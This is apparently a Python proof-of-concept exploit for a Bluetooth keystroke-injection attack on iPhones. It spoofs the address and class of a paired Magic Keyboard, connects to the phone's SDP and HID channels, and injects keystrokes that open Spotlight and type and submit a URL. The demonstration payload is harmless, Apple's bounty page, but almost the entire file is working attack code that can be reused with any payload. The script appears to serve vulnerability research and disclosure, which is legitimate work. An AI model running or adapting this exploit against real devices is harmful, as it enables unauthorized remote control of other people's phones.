#!/usr/bin/env python3

import binascii
import bluetooth
import logging
import subprocess
import time
import os
import sys
import re
from subprocess import Popen, PIPE, STDOUT
from threading import Thread

def log_info_green(msg):
  COLOR_GREEN = "\033[92m"
  COLOR_CLEAR = "\033[0m"
  msg = COLOR_GREEN + msg + COLOR_CLEAR
  logging.info(msg)


def run(command):
  assert(isinstance(command, list))
  logging.debug("executing '%s'" % " ".join(command))
  return subprocess.check_output(command, stderr=subprocess.PIPE)


def send_hid(hex):
  c19.send(binascii.unhexlify(hex)),
  time.sleep(0.008)


def send_command_space():
  send_hid("a10108002c000000000000")
  send_hid("a101000000000000000000")


def send_keystroke(c, shift=False):
  h = "%02x" % c
  send_hid("a1010000" + h + "000000000000")
  send_hid("a101000000000000000000")


def send_ascii(ascii):
  for c in ascii:
    if c == ' ':
      send_keystroke(0x2c)
    elif c == '/':
      send_keystroke(0x38)
    elif c >= 'a' and c <= 'z':
      send_keystroke(ord(c) - ord('a') + 0x04)
    elif c == '.':
      send_keystroke(0x37)
    elif c == ':':
      send_hid("a101200033000000000000")
      send_hid("a101000000000000000000")
    else:
      logging.error("send_ascii(): unhandled char ", c)
      quit()


hci_up = lambda index: run(["sudo", "hciconfig", "hci%d" % index, "up"])
hci_down = lambda index: run(["sudo", "hciconfig", "hci%d" % index, "down"])
hci_pscan = lambda index: run(["sudo", "hciconfig", "hci%d" % index, "pscan"])
hci_reset = lambda index: run(["sudo", "hciconfig", "hci%d" % index, "reset"])
hci_ssp_off = lambda index: run(["sudo", "hciconfig", "hci%d" % index, "sspmode", "0"])
hci_ssp_on = lambda index: run(["sudo", "hciconfig", "hci%d" % index, "sspmode", "1"])
hci_name = lambda index, name: run(["sudo", "hciconfig", "hci%d" % index, "name", "%s" % name])
hci_class = lambda index, _class: run(["sudo", "hciconfig", "hci%d" % index, "class", _class])
bdaddr = lambda index, addr: run(["sudo", "./bluez-bdaddr/bdaddr", "-i", "hci%d" % index, addr])

def restart_bluetooth_service():
  run(["sudo", "service", "bluetooth", "restart"])

def register_hid_profile():
  run(["sudo", "sdptool", "add", "keyb"])

def clear_sdp_records():
  output = run(["sudo", "sdptool", "browse", "local"])
  for line in output.decode().split("\n"):
    if "RecHandle" in line:
      handle = line.split(" ")[-1]
      if re.match(r"0x[a-f0-9]{5}", handle):
        run(["sudo", "sdptool", "del", handle])

def set_controller_address(hci_index, addr):
  hci_reset(hci_index)
  hci_up(hci_index)
  bdaddr(hci_index, addr)
  hci_reset(hci_index)
  hci_up(hci_index)
  if keyboard_addr not in run(["hciconfig", "hci%d" % hci_index]).decode():
    logging.error("Error setting Bluetooth adapter address!")
    quit()

def configure_controller(hci_index, keyboard_address, hid=True):
  restart_bluetooth_service()
  clear_sdp_records()
  if hid == True:
    register_hid_profile()
  set_controller_address(hci_index, keyboard_address)
  hci_name(hci_index, "Keyboard")
  hci_class(hci_index, "0x002540")

def wait_for_sdp_request(hci_index):
  with Popen('sudo hcidump -i hci%d' % hci_index, stdout = PIPE, stderr = STDOUT, shell = True) as p:
    while True:
      line = p.stdout.readline()
      if b"L2CAP(d): cid 0x0041 len 13 [psm 1]" in line:
        break
      if b"L2CAP(d): cid 0x0040 len 13 [psm 1]" in line:
        break
      if b"L2CAP(s): Connect req: psm 1" in line:
        break
      if not line: break
      logging.debug(line)

def build_bdaddr():
  if not os.path.exists("bluez-bdaddr/bdaddr"):
    cmd = [
      "cc",
      "-o",
      "bluez-bdaddr/bdaddr",
      "bluez-bdaddr/bdaddr.c",
      "bluez-bdaddr/oui.c",
      "-Ibluez-bdaddr",
      "-lbluetooth"
    ]
    run(cmd)


class L2CAPClient:
  def __init__(self, addr, port, retries=5000, connect_timeout=5):
    logging.info("attempting to connect to %s on port %d" % (addr, port))
    self.cancel = True
    self.port = port
    self.addr = addr
    self.queue = []
    for x in range(retries):
      time.sleep(0.001)
      try:
        self.sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        self.sock.settimeout(connect_timeout)
        self.sock.connect((addr, port))
        logging.info("SUCCESS! Connected to %s on port %d" % (addr, port))
        self.cancel = False
        break
      except:
        self.sock.close()
        time.sleep(0.001)
    if self.cancel:
      logging.info("failed to connect to %s on port %d; exiting" % (addr, port))
      quit()
    self.sock.settimeout(0.01)
    self.thread = Thread(target=self.recv_loop)
    self.thread.start()

  def recv_loop(self):
    while not self.cancel:
      try:
        raw = self.sock.recv(256)
        if len(raw) == 0:
          logging.info("socket %d closed; aborting" % self.port)
          quit()
        if self.port == 17:
          self.send(b"\x00")
        logging.info("[RX-%d] %s" % (self.port, binascii.hexlify(raw).decode()))
        self.queue.append(raw)
      except Exception as ex:
        if str(ex) != "timed out":
          logging.error("[ERR-%d] %s" % (self.port, ex))
          time.sleep(0.01)
          return

  def close(self):
    self.sock.close()
    self.cancel = True
    self.thread.join()

  def send(self, data):
    if data != b"\x00" or self.port != 1:
      logging.info("[TX-%d] %s" % (self.port, binascii.hexlify(data).decode()))
    self.sock.sendall(data)


if __name__ == "__main__":
  logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

  # build bdaddr on first run
  build_bdaddr()

  # parse command-line arguments
  is_bt_addr = lambda addr: re.match(r"([a-fA-F0-9]{2}:{0,1}){5}[a-fA-F0-9]{2}", addr)
  if len(sys.argv) != 4 \
     or not re.match(r"hci\d", sys.argv[1]) \
     or not is_bt_addr(sys.argv[2]) \
     or not is_bt_addr(sys.argv[3]):
    print("usage: ./iphone-poc.py <hciX> <BT_ADDR_IPHONE> <BT_ADDR_KEYBOARD>")
    quit()
  hci_index = int(sys.argv[1][-1])
  host_addr = sys.argv[2]
  keyboard_addr = sys.argv[3]

  # setup the Bluetooth controller to spoof the target keybaord
  configure_controller(hci_index, keyboard_addr, hid=True)

  # connect to SDP service on iPhone
  hci_ssp_off(hci_index)
  c1 = L2CAPClient(host_addr, 1)
  hci_ssp_on(hci_index)
  logging.info("Connected to Bluetooth SDP service on the iPhone")

  # print instructions trigger the attack
  log_info_green("On the iPhone, try connecting to the paired Magic Keyboard " \
                 "to trigger the keystroke-injection attack.")
  wait_for_sdp_request(hci_index)

  # connect to Bluetooth-HID services on the iPhone
  log_info_green("Connecting to Bluetooth HID services on the iPhone")
  c17 = L2CAPClient(host_addr, 17, connect_timeout=None)
  c19 = L2CAPClient(host_addr, 19, connect_timeout=None)

  # wait for Bluetooth HID init, then send the keystroke-injection payload
  hid_ready = False
  t0 = None
  try:
    while True:
      time.sleep(0.001)

      # monitor HID-interrupt messages to detect when the iPhone
      # is ready to receive keystrokes
      if len(c19.queue) > 0:
        for item in c19.queue:
          if item == b'\xa2\xf1\x01\x00' and hid_ready == False:
            hid_ready = True
            t0 = time.time()
        c19.queue = []

      # respond to all HID-control messages with a single zero-byte
      if len(c17.queue) > 0:
        t0 = time.time()
        c17.queue = []

      # transmit the keystroke-injection payload once the HID channel is ready
      if hid_ready == True and time.time() - t0 > 0.5:
        log_info_green("Transmitting keystroke-injection payload")
        send_command_space()
        time.sleep(0.25)
        send_ascii("https://security.apple.com/bounty/")
        time.sleep(0.25)
        send_keystroke(0x28)
        time.sleep(0.25)
        send_keystroke(0x28)
        log_info_green("Keystroke-injection payload has been transmitted to the iPhone")
        raise KeyboardInterrupt()

  except KeyboardInterrupt:
    hci_down(hci_index)
    try:
      c1.close()
      c19.close()
      c17.close()
    except:
      pass
